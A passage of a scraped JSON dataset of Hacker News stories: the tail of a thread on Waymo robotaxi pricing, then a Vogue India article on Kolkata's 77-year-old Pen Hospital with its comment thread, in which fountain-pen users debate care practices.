https://x.com/Boenau/status/1795495310170685915 reply clpm4j 21 hours agorootparentprevYes, they're actually awesome. 'Waymo' has replaced 'Uber' in my vocabulary, e.g. \"Let's just Waymo there\". reply a0986373 20 hours agorootparentHow much does the average trip go for distances such as your use case? reply clpm4j 17 hours agorootparentOn average, within SF (say, a 3-4 mile trip), is typically ~$20. Peak times on Friday or Saturday evenings can definitely exceed $35, but I've yet to have any ride go above $50. reply a0986373 16 hours agorootparentDoes it matter if you enter with multiple people? Does the charge go up (whereas Uber/Lyft grants you 3+ seats by default)? reply fragmede 13 hours agorootparentDoesn't matter, and the total is 4 people. reply JumpCrisscross 20 hours agorootparentprev> How much does the average trip go for distances such as your use case? They seem to undercut Uber and Lyft by a hair. Given the longer wait times, and lack of a need to tip, that seems fair. (In San Francisco, they undercut by a wider margin. But human ride shares are more expensive there for a variety of reasons.) reply brrwind 20 hours agorootparentThat's not my experience. I've rarely seen a comparably priced ride. They're usually at least 50% more expensive than Uber or Lyft. reply JumpCrisscross 20 hours agorootparent> usually at least 50% more expensive than Uber or Lyft Hmm, I used them this weekend and was comparing pricing. Waymo was cheaper. That said, I wasnâ€™t riding during peak traffic. And in peak traffic, Iâ€™d vastly prefer a Waymo. So I get the premium pricing. reply philkrie 20 hours agorootparentprevIn my experience it seems that the price floor is higher, but the ceiling is lower. Short rides (~10 min) that might cost 8-9$ (before tip) on Uber / Lyft, cost $18-20 on Waymo. If I'm going to the other side of San Francisco (say, North Beach to Stonestown), it will be $33-35. I've never seen it in the $40s-50s as I often do with Uber / Lyft for long distance trips during surge pricing. But that's just anecdotal. reply 0xDEAFBEAD 14 hours agorootparentprevWhy is that? Waym",
    "originSummary": [
      "Waymo, initially the \"Google Self-Driving Car Project,\" has become a leader in the autonomous vehicle industry, offering fully autonomous rideshare services in Phoenix, San Francisco, and parts of Los Angeles.",
      "Unlike competitors such as Uber and General Motors' Cruise, which have faced setbacks and safety issues, Waymo has progressed steadily due to its cautious scaling approach, robust engineering, and financial backing from Alphabet.",
      "Waymo's fleet of Jaguar I-Pace electric SUVs, equipped with advanced sensors, has largely avoided major accidents, but the company now faces regulatory scrutiny and competition from emerging players like Tesla."
    ],
    "commentSummary": [
      "Waymo's rigorous approach to autonomous driving has led to a successful robo-taxi business, distinguishing it from competitors like Tesla and Uber, who face criticism for less stringent methods.",
      "Waymo's Level 4 system is praised for its safety and reliability, especially in specific conditions, while Tesla's Full Self-Driving (FSD) technology is critiqued for its unreliability and frequent errors.",
      "Discussions highlight the challenges of unpredictable driving conditions, the debate between using cameras versus LIDAR, and the potential economic and cultural impacts of autonomous vehicles."
    ],
    "points": 176,
    "commentCount": 326,
    "retryCount": 0,
    "time": 1717013996
  },
  {
    "id": 40516983,
    "title": "Kolkata's 77-Year-Old Pen Hospital Revives Cherished Fountain Pens",
    "originLink": "https://www.vogue.in/content/pen-hospital-in-kolkata-will-nurse-your-broken-fountain-pen-back-to-health",
    "originBody": "CULTURE & LIVING The Pen Hospital in Kolkata will nurse your broken fountain pen back to full health For 77 years, the Pen Hospital has been performing successful surgeries on fountain pens before discharging them back to their owners BY DEBABRATEE DHAR 29 May 2024 Photographed by Munjarita Mondal â€œYouâ€™ve not been taking proper care of your pen,â€ Muhammad Imtiaz grumbles while treating his latest patientâ€”and the victim of my negligenceâ€”a Gold Leaf Jinhao fountain pen. As much as I would like to claim that I purchased this pen in pursuit of finer calligraphy, the truth is that an attractive discount online made me snap it up. After two months of blotting through numerous notebooks and sporting ink-stained hands, I had severely damaged the ink socket. Not wanting to lay it to rest yet, I took my ailing pen to the only place in the city where I knew it could be nursed back to healthâ€”the Pen Hospital. Situated in the heart of central Kolkata and hidden amongst vintage bars, ramshackle buildings and the famous Metro cinema of Chowringhee, the 77-year-old Pen Hospital is a relic of the past. It was established in the late â€™50s by Imtiazâ€™s grandfather, Muhammad Samsuddin, along with a few other technicians, all skilled in the mechanics of fountain pens. Photographed by Munjarita Mondal Photographed by Munjarita Mondal MOST POPULAR CULTURE & LIVING Latest OTT releases this week: 13 new movies and TV shows to watch on Netflix, Disney+ Hotstar, Prime Video and more BY PRABAL SHARMA FASHION The Adidas trainers that might just outsell sambas in 2024 BY EMMA SPEDDING BEAUTY How to manage an oily scalp and frizzy hair, according to experts BY ANUSHA KALA â€œI donâ€™t know who sold you this pen but they clearly did not mention how to care for it,â€ says Imtiaz, cradling my pen in the palm of his hand. He looks up, a frown on his face. â€œFountain pens are a labour of love. If you donâ€™t have the time to care for them, perhaps a roller pen would suit you better.â€ I smile sheepishly at his barely disguised taunt. He shakes his head, then he goes on to explain how the excess ink in a fountain pen needs to be washed off with clean water at least once a week. In a flourish of movements, he shows me how to hold the nib with the appropriate amount of pressure against the paper to create a clear ink flow. He makes me practise on a notepad until he feels confident in my ability to hold the pen correctly. Then, the pen doctor writes me a prescription and charges a fee of only â‚¹50 for his consultation. Photographed by Munjarita Mondal Photographed by Munjarita Mondal MOST POPULAR CULTURE & LIVING Latest OTT releases this week: 13 new movies and TV shows to watch on Netflix, Disney+ Hotstar, Prime Video and more BY PRABAL SHARMA FASHION The Adidas trainers that might just outsell sambas in 2024 BY EMMA SPEDDING BEAUTY How to manage an oily scalp and frizzy hair, according to experts BY ANUSHA KALA Photographed by Munjarita Mondal An establishment dedicated to fixing and selling fountain pens may sound anachronistic in an era that becomes more digital with each passing day. Besides, for those who need it, stationery can easily be brought for loose change. â€œFor my customers, fountain pens are not just stationery,â€ Imtiaz scoffs. â€œIt is a personal belonging that they hold onto and pass down as heirlooms.â€ He digs out a fountain pen from under his cabinet, neatly wrapped in white paper with its ownerâ€™s initials written on it. â€œThis is a vintage Waterman model that costs well over â‚¹20,000. The owner has trusted me to fix it,â€ he says, the pride in his voice unmistakable. I peer over the glass cabinet and find box upon box of fountain pens neatly stacked in a row, each wrapped in a paper detailing their ownerâ€™s name and address, waiting to be discharged. â€œIn my grandfatherâ€™s time, pen mechanisms were simple. One simply had to fix the nib or add a socket and make small changes to the body parts,â€ explains Imtiaz. â€œNow itâ€™s more complex. We often have to contact the companies and ask them to send us branded parts to fix these pensâ€. MOST POPULAR CULTURE & LIVING Latest OTT releases this week: 13 new movies and TV shows to watch on Netflix, Disney+ Hotstar, Prime Video and more BY PRABAL SHARMA FASHION The Adidas trainers that might just outsell sambas in 2024 BY EMMA SPEDDING BEAUTY How to manage an oily scalp and frizzy hair, according to experts BY ANUSHA KALA Photographed by Munjarita Mondal Photographed by Munjarita Mondal MOST POPULAR CULTURE & LIVING Latest OTT releases this week: 13 new movies and TV shows to watch on Netflix, Disney+ Hotstar, Prime Video and more BY PRABAL SHARMA FASHION The Adidas trainers that might just outsell sambas in 2024 BY EMMA SPEDDING BEAUTY How to manage an oily scalp and frizzy hair, according to experts BY ANUSHA KALA Photographed by Munjarita Mondal There was a time when fountain pens were ubiquitous writing instruments, used by everyone from businessmen and students to professors and shopkeepers. â€œIn the past, people purchased fountain pens out of necessity,â€ recalls Imtiaz. â€œThat changed in the early â€™2000s when ball pens and roller pens took over the market. Eventually, all the big companies like Pilot, Caravan, Doctor, Artist and Wilson shut down their factories in India.â€ If the Pen Hospital has managed to survive it is by the grace of a dedicated customer base. Photographed by Munjarita Mondal MOST POPULAR CULTURE & LIVING Latest OTT releases this week: 13 new movies and TV shows to watch on Netflix, Disney+ Hotstar, Prime Video and more BY PRABAL SHARMA FASHION The Adidas trainers that might just outsell sambas in 2024 BY EMMA SPEDDING BEAUTY How to manage an oily scalp and frizzy hair, according to experts BY ANUSHA KALA Photographed by Munjarita Mondal During the exam season and on occasions like Teacherâ€™s Day, the Pen Hospital receives a footfall of over ten to fifteen people. On slower days, Imtiaz and his nephew can be found at the shop front, fixing up clientsâ€™ fountain pens while a table fan whirs tirelessly. The shelves are stacked with cartons of fountain pens, ink pots and cleaning equipment. At the Pen Hospital, there is a fountain pen with a customised nib for every purpose. Imtiaz shows me the writing style of fine, medium, broad, double board and flex nibbed fountain pens and points out which one is meant for calligraphy, stenography, sheet music, Devanagari script and Urdu script. I find myself drawn to a pen with an elegant, swan-like neck. He follows my gaze and announces, â€œThis is the lady nib,â€ named after the fact that the nibs are curved to fit into womenâ€™s hands which are typically smaller. â€œWaterman first came out with these nibs back in the â€™30s,â€ he continues. â€œSince then, Hero, Parker and a few other Korean and Japanese brands have come up with their own interpretations of the lady nib at a much cheaper price.â€ MOST POPULAR CULTURE & LIVING Latest OTT releases this week: 13 new movies and TV shows to watch on Netflix, Disney+ Hotstar, Prime Video and more BY PRABAL SHARMA FASHION The Adidas trainers that might just outsell sambas in 2024 BY EMMA SPEDDING BEAUTY How to manage an oily scalp and frizzy hair, according to experts BY ANUSHA KALA Photographed by Munjarita Mondal Photographed by Munjarita Mondal MOST POPULAR CULTURE & LIVING Latest OTT releases this week: 13 new movies and TV shows to watch on Netflix, Disney+ Hotstar, Prime Video and more BY PRABAL SHARMA FASHION The Adidas trainers that might just outsell sambas in 2024 BY EMMA SPEDDING BEAUTY How to manage an oily scalp and frizzy hair, according to experts BY ANUSHA KALA As I examine the lady nib, a middle-aged woman with short hair and a large office bag comes up to the shop front. â€œImtiaz da,â€ she beseeches, â€œcan you please take a look at this fountain pen?â€ He welcomes her in, asking about a fountain pen he had recently fixed for her. Then he introduces her to me as Pritha Mukherjee, an employee at the nearby City Corporation building. â€œMy father was a regular for the last 20 years,â€ Mukherjee tells me. â€œI mostly come here because my son loves collecting fountain pens.â€ Leaving us to our conversation, Imtiaz busies himself with what he calls the â€œtricky socketâ€ of Mukherjeeâ€™s clear fountain pen. At this point, I too decide to take my leave, dreading the 5pm office rush which will follow me from Chowringhee, all the way to the metro ride home. As I walk out, the pen doctor looks up from his work and calls out dutifully: â€œWash the socket at least once a week.â€ Also read: Kanan Gill is more excited about writing movies than acting in them The 18 most-anticipated Indian books of 2024 51 best comedy movies of all time that will have you crying with laughter",
    "commentLink": "https://news.ycombinator.com/item?id=40516983",
    "commentBody": "The Pen Hospital in Kolkata will nurse your broken fountain pen back (vogue.in)174 points by axiomdata316 22 hours agohidepastfavorite41 comments cge 18 hours agoI mostly write with fountain pens, primarily pre-1980s, but find myself rather confused by much of this article. Presumably there are terminology differences involved, but I have no idea what he is referring to by 'socket', why it needs to be washed weekly, or why he would add one to a pen. I can't find anything online, and the various uses of the word in the article don't really fit any part of a fountain pen that I do know about. I don't understand how a nib would be curved to fit a smaller hand: the 1930s Waterman reference he makes might be a reference to the Lady Patricia, but that's a smaller-bodied version of the at-the-time quite large Patrician; I don't think the nib, or even the size, is particularly different than Watermans before it. I'm also not sure I'd agree about modern pen mechanisms being more complex: while the article is inconsistent about when the shop was opened (77 years ago, but also late 1950s), that would have put the shop during his grandfather's time right around an era of pens like the Sheaffer Snorkel (filled through an extending snorkel by a pneumatic mechanism to avoid the nib, itself with an unusual cylindrical design, needing to be immersed in ink) that are particularly complex compared to modern fountain pens, which mostly seem to use typical, stiff nib and feed designs, and cartridges or converters rather than elaborate filling mechanisms. I certainly don't 'wash off' a pen with water once a week when I'm using it, and I'm not even sure what that would mean. Unless there's a problem with ink flow, there should not be 'excess ink'. Is he saying the pen should be flushed once a week? That seems quite excessive. It's just very odd that he seems quite insistent about the necessity of something that I've never heard of. reply mangamadaiyan 10 hours agoparentApparently \"socket\" is an archaic term for \"nib unit\". Even so, I would be very chary of unscrewing a nib unit and washing it every week. I get the feeling that the article was written by someone who is completely unfamiliar with fountain pens, and who did not bother to do their homework. For all I know, the author misheard \"sac\" as \"socket\". The recommendations of washing the pen once a week also sound completely off. reply robertlagrant 10 hours agorootparent> I get the feeling that the article was written by someone who is completely unfamiliar with fountain pens, and who did not bother to do their homework. The author's articles[0] are mostly posh listicles, so it wouldn't surprise me. [0] https://www.vogue.in/author/debabratee-dhar reply jerlam 2 hours agorootparentprevThe only reasons I can think of to wash the nib unit on a regular basis would be: 1. The cap is not sealing correctly against the pen, letting the ink dry in the nib and feed 2. The ink is not water soluble, so if it does dry it cannot be fixed with a water flush But these two problems were mostly solved 70 years ago. reply jlund-molfese 16 hours agoparentprevI think he must be talking about the ink bladder (and replacing, rather than adding), there's nothing else that makes sense. Although, depending on the properties of your ink, it shouldn't be necessary to rinse the bladder every week anyway. reply ImPostingOnHN 14 hours agoparentprevYou can pull out nibs and ink reservoirs. My guess is the socket is the connection between the two. Perhaps you would add a larger one to fit a different nib. reply mangamadaiyan 10 hours agorootparentPulling out the nib is only possible with a friction-fit nib and feed. Most modern pens (with a few exceptions) do not have friction-fit nibs. \"Ink reservoirs\" can't always be pulled out either. A cartridge converter can definitely be taken out. \"Reservoir\" typically refers to a rubber or silicone bladder. These are usually fixed in place by an adhesive, and need some effort to remove. reply LennyHenrysNuts 16 hours agoparentprevI came here to say this. I have no idea what a socket might be. I flush my pens monthly or if I intend to put it away for a while. reply noufalibrahim 12 hours agoprevI'm from Kerala in India and have visited a similarly named establishment in a town called Trichur https://www.thenewsminute.com/kerala/visit-hospital-kerala-t.... It's got some nostalgic value but not much more. There's another shop which fountain pen enthusiasts might like as well. It's also in Kerala but closer to where I live called \"Kim and Co.\". They make pens with ebonite bodies. These don't have pistons on any other such reservoirs. You pour ink straight into the body and it stays there. Their claim to fame is that the thread is good enough so that with 3 turns, it locks and holds the ink without leaking. I have one of their pens but don't use it on a daily basis. https://www.fountainpennetwork.com/forum/topic/304573-a-mast... My own daily use pen is a Noodlers Ahab. The main reason I prefer this is because the nib is flexible and so you can do simply copperplate or spencerian using it. Great for headings. reply Al-Khwarizmi 11 hours agoparentI didn't know Kim and Co.; but I have handmade Indian fountain pens from ASA Pens, Ranga Pens and Fosfor Pens and all of them are excellent. And the price is a steal compared to what one can get in e.g. the EU. My only peeve is that for some reason (cultural I guess?) most pens by these manufacturers are what I would consider very large (for my taste, 13-14 cm length closed and ~13 mm diameter, like a Platinum Century #3776 or an Aurora Optima, is a good size). I always end up fishing for the smallest models, e.g. I like the Ranga Markandeya. reply draven 11 hours agoparentprev> You pour ink straight into the body and it stays there. If you want to search for more examples of this kind of pens, they are called eyedropper pens. reply Brajeshwar 8 hours agorootparentAnd the tip is to use a Syringe to \"pour\" the ink. reply noufalibrahim 8 hours agorootparentYup. That's what I do. reply xnx 18 hours agoprevInteresting story to show up the same day as \"The rise of the disposable car\": https://news.ycombinator.com/item?id=40512517 In Cuba, they refill disposable lighters: https://www.youtube.com/shorts/6ysxekWL9Gk reply TomK32 12 hours agoparentIt's quite sad how many disposable e-smoke thingies one can find littering the streets, even in a quite nice city like the one I live. OTOH: Most times it's another small rechargeable battery for my electronics projects. Madness reply websap 19 hours agoprevGives me great joy to see my hometown, the City of Joy (Kolkata) making it to the frontpage of HN. :`) reply 0xd1r 5 hours agoparentIndeed, quite lovely to see. Wish someone did a piece on 'Metro Gali', where there are people like this for cameras. reply pigcat 4 hours agoprevWeird thing... The links in that article are to totally unrelated pages on the same Vogue India site. eg. the first link `pen` takes you to an article about therapy. Anyone know why they might do this? Is it some SEO trick? reply lofatdairy 20 hours agoprevFountain Pen Hospital in NYC is also pretty good. Kolkata is probably a lot less expensive though haha reply pivic 14 hours agoparentI was going to mention them! Absolutely lovely people and assortment. Bought a great 1980s Pelikan M400 from them. P.s. They're on Murray Street, where Sonic Youth used to have their old rehearsal space. reply shivdeepak 13 hours agoprevI remember my first and only visit to Kolkata (then Calcutta) in the late 1990s. I had never seen such a huge density of pen shops anywhere else. I am not a collector, but I used to like pens then because I was a student. I loved that place. reply nikau 19 hours agoprevThen off to penisland to recuperate Edit: I guess youngins don't remember pen island penisland.com reply Dwedit 15 hours agoparentIt's .net reply nikau 10 hours agorootparentI stand corrected reply deadbabe 18 hours agoprevIf you look closely in markets and bazaars you can often come across little niche boutique shops like this: Repair shops for instance that specialize in repairing old school video game consoles. They toil all day replacing aging capacitors, upgrading boards to work with modern TVs and put out clean crisp pixel output, rebuilding broken consoles using harvested parts, replacing batteries of old cartridges, replacing worn cases, and even selling karts with libraries of multiple (pirated) ROMs installed. They donâ€™t make much money, but it sustains their work. reply WillAdams 18 hours agoprevOr, if you're in the U.S.: https://fountainpenhospital.com/ reply tempodox 1 hour agoprevI'd love to see a fountain pen with its clip in a cast. But seriously, +1 for doing the repairs and reducing waste. reply hwc 19 hours agoprevI would love a class on taking care of my fountain pens. Maybe I'll find something on YouTube. reply disqard 1 hour agoparent1. Search for \"TWSBI Eco\" at https://www.jetpens.com and buy the color you like best. 2. Fill it with the ink you like best. In general, you can't go wrong with Pilot Iroshizuku (again, jetpens) 3. When you're done using this pen, twist it (no need to overdo the torque). 4. When you next need to use it, months (or even a year) later, It. Will. Work. I own several different fountain pens, and this one is the only one that I can truly call \"maintenance-free\". Of course, if you do enjoy tinkering with your fountain pens, don't let me stop you. It's a wonderful hobby! reply Ancapistani 16 hours agoparentprevDonâ€™t do it. I did, about eight years ago. Now there is a lathe in my office that I use to make replacement parts for century-old pens. reply disqard 1 hour agorootparentThat is lovely to hear! You brightened my day a little more. Keep doing it, and maybe share a blog post about your work? I know there are dozens (!) of us who would read it closely :) reply ashton314 15 hours agorootparentprevThe rabbit hole is deep, but boy have you gone far reply ConsiderCrying 11 hours agorootparentprevAh yes, the logical endpoint of any quirky hobby - becoming so invested in it that your family simply has to smile and nod approvingly while they pray it doesn't spill over into the living room. That said, if you're that skilled with a lathe, it should probably be considered a useful life skill. reply thenobsta 4 hours agorootparentGrowing up, my mom drew the line on vintage motorcycle parts in the dishwasher. Sometimes though, in the winter, the motorcycles were allowed inside. God bless her. reply mangamadaiyan 18 hours agoparentprevMost fountain pen issues can usually be fixed by a good, thorough, cleaning. If the nib is scratchy, its tines are likely misaligned, and need alignment. You'll need a 10x (or better) jeweller's loupe to check the tines for alignment. More complex solutions for more complex problems exist, but these are the most common by far. It is possible to pick up these things by watching videos, but I'd recommend you to make contact with your local fountain pen club - such things do exist :) reply GarnetFloride 19 hours agoparentprevJetPens has a video and article for the care of fountain pens. reply lawrenceyan 11 hours agoprevWhat a lovely read. Sometimes I forget why I keep opening HN everyday, and then I remember. I will wash my pen once a week from now on! reply mangamadaiyan 4 hours agoparentPlease don't wash your pen once a week. You only need to flush it if you're changing inks, or if you're putting it away in storage. As long as you're writing with your pen at least once in a couple of days, _and_ you're using a reasonable ink - you most certainly do not need to wash it every week. You don't have to take my word for it -- just hang out on FPN, or even better, hang out with your local fountain pen club. reply bandrami 7 hours agoprevThis is without a doubt the most Kolkata thing I have ever seen reply smeej 18 hours agoprev [â€“] Some seal in my pen broke and ink leaks out around where I hold it. It's disappointing, but I'm unlikely to travel around the world to fix it! I'd happily ship it to them and take my chances on getting it back, because it's not like I can use it right now anyway. Unfortunately, though, I also developed a fondness for stone paper, and apparently that doesn't pair well with fountain pens. reply bayindirh 13 hours agoparent [â€“] Whatâ€™s the brand/model? Maybe you can find the part and replace it. Stone paper is a very fine sand paper in practice. Eats fountain pen nibs. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The Pen Hospital in Kolkata, a 77-year-old shop, specializes in repairing and maintaining fountain pens, attracting pen enthusiasts who consider their pens as cherished heirlooms.",
      "Currently run by Muhammad Imtiaz, the grandson of the founder, the shop thrives despite the digital age and cheaper stationery due to its dedicated clientele.",
      "Imtiaz not only repairs pens but also educates customers on proper pen care, with the shop seeing increased visitors during exam seasons and special occasions."
    ],
    "commentSummary": [
      "An article on \"The Pen Hospital\" in Kolkata, which repairs fountain pens, initiated a discussion on Hacker News about pen maintenance and terminology accuracy.",
      "Topics included ink drying, cleaning practices, differences between modern and older pen designs, and the environmental impact of disposable items.",
      "Users shared personal preferences, tips, resources for pen maintenance, and anecdotes about pen collecting and niche hobbies."
    ],
    "points": 174,
    "commentCount": 41,
    "retryCount": 0,
    "time": 1717016496
  }
]
